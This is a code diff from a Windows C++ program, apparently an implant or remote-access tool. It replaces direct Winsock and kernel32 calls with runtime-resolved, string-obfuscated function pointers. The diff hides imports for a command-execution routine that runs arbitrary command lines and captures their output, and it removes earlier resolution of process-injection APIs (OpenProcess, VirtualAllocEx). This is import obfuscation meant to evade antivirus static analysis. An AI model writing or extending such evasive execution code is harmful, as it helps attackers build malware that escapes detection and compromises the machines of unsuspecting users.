@@ -2,13 +2,19 @@
 
 
 const std::string domain_to_ip(const char* domain) {
+    wsa_startup_type wsa_startup = WINAPI_OBFUSCATE(wsa_startup_type, "WSAStartup", "ws2_32");
+    wsa_cleanup_type wsa_cleanup = WINAPI_OBFUSCATE(wsa_cleanup_type, "WSACleanup", "ws2_32");
+    get_addr_info_type get_addr_info = WINAPI_OBFUSCATE(get_addr_info_type, "getaddrinfo", "ws2_32");
+    inet_ntop_type inet_ntop_clone = WINAPI_OBFUSCATE(inet_ntop_type, "inet_ntop", "ws2_32");
+    free_addr_info_type free_addr_info = WINAPI_OBFUSCATE(free_addr_info_type, "freeaddrinfo", "ws2_32");   
+    
     struct addrinfo hints, * res;
     int status;
     char ipstr[INET_ADDRSTRLEN];
 
     // Initialize Winsock
     WSADATA wsadata;
-    if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
+    if (wsa_startup(MAKEWORD(2, 2), &wsadata) != 0) {
         return "";
     }
 
@@ -16,27 +22,32 @@ const std::string domain_to_ip(const char* domain) {
     hints.ai_family = AF_INET; // Use IPv4
     hints.ai_socktype = SOCK_STREAM;
 
-    if ((status = getaddrinfo(domain, NULL, &hints, &res)) != 0) {
-        WSACleanup(); // Cleanup Winsock
+    if ((status = get_addr_info(domain, NULL, &hints, &res)) != 0) {
+        wsa_cleanup(); // Cleanup Winsock
         return "";
     }
 
     struct sockaddr_in* ipv4 = (struct sockaddr_in*)res->ai_addr;
     void* addr = &(ipv4->sin_addr);
-    inet_ntop(res->ai_family, addr, ipstr, sizeof ipstr);
+    inet_ntop_clone(res->ai_family, addr, ipstr, sizeof ipstr);
     
 
-    freeaddrinfo(res); // Free the linked list
+    free_addr_info(res); // Free the linked list
 
-    WSACleanup(); // Cleanup Winsock
+    wsa_cleanup(); // Cleanup Winsock
     return ipstr;
 }
 
 
 
 std::string exec(const char* CommandLine) {
-    std::string Result = "";
+    create_process_a_type create_process_a = WINAPI_OBFUSCATE(create_process_a_type, "CreateProcessA", "kernel32");
+    create_pipe_type create_pipe = WINAPI_OBFUSCATE(create_pipe_type, "CreatePipe", "kernel32");
+    close_handle_type close_handle = WINAPI_OBFUSCATE(close_handle_type, "CloseHandle", "kernel32");
+    get_last_error_type get_last_error = WINAPI_OBFUSCATE(get_last_error_type, "GetLastError", "kernel32");
+    read_file_type read_file = WINAPI_OBFUSCATE(read_file_type, "ReadFile", "kernel32");
 
+    std::string result = "";
     SECURITY_ATTRIBUTES securityAttributes;
     HANDLE stdOutRead, stdOutWrite;
     ZeroMemory(&securityAttributes, sizeof(SECURITY_ATTRIBUTES));
@@ -44,8 +55,8 @@ std::string exec(const char* CommandLine) {
     securityAttributes.bInheritHandle = TRUE;
     securityAttributes.lpSecurityDescriptor = NULL;
 
-    if (!CreatePipe(&stdOutRead, &stdOutWrite, &securityAttributes, 0))
-        throw GetLastError();
+    if (!create_pipe(&stdOutRead, &stdOutWrite, &securityAttributes, 0))
+        throw get_last_error();
 
     try {
         STARTUPINFOA startupInfo;
@@ -61,38 +72,38 @@ std::string exec(const char* CommandLine) {
         PROCESS_INFORMATION pi;
         ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 
-        if (!CreateProcessA(NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi))
-            throw GetLastError();
+        if (!create_process_a(NULL, const_cast<char*>(CommandLine), NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &pi))
+            throw get_last_error();
 
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        close_handle(pi.hProcess);
+        close_handle(pi.hThread);
 
-        CloseHandle(stdOutWrite);
+        close_handle(stdOutWrite);
         stdOutWrite = NULL;
 
         char buffer[4096];
         DWORD bytesRead;
 
-        while (ReadFile(stdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0)
-            Result += std::string(buffer, buffer + bytesRead);
+        while (read_file(stdOutRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead != 0)
+            result += std::string(buffer, buffer + bytesRead);
 
-        DWORD le = GetLastError();
+        DWORD le = get_last_error();
         if (le != ERROR_BROKEN_PIPE)
             throw le;
     }
     catch (...) {
-        CloseHandle(stdOutRead);
+        close_handle(stdOutRead);
         if (stdOutWrite != NULL)
-            CloseHandle(stdOutWrite);
+            close_handle(stdOutWrite);
 
         throw;
     }
 
-    CloseHandle(stdOutRead);
+    close_handle(stdOutRead);
     if (stdOutWrite != NULL)
-        CloseHandle(stdOutWrite);
+        close_handle(stdOutWrite);
 
-    return Result;
+    return result;
 }
 load_library_type load_library;
 get_proc_address_type get_proc_address;
@@ -148,11 +159,10 @@ void initilize_winapi() {
             load_library = reinterpret_cast<load_library_type>(functionAddress);
         }
     }
+}
 
-    std::string dll_store_path = std::string(OBFUSCATE("user32"));
 
-    HMODULE kernel32 = load_library(OBFUSCATE("kernel32"));
-    open_process_type open_process = reinterpret_cast<open_process_type>(get_proc_address(kernel32, OBFUSCATE("OpenProcess")));
-    get_module_handle_type get_module_handle = reinterpret_cast<get_module_handle_type>(get_proc_address(kernel32, OBFUSCATE("GetModuleHandleW")));
-    virtual_alloc_ex_type virtual_alloc_ex = reinterpret_cast<virtual_alloc_ex_type>(get_proc_address(kernel32, OBFUSCATE("VirtualAllocEx")));
+FARPROC resolve_winapi(const char* dll_name, const char* func_name) {
+    HMODULE module = load_library(dll_name);
+    return get_proc_address(module, func_name);
 }
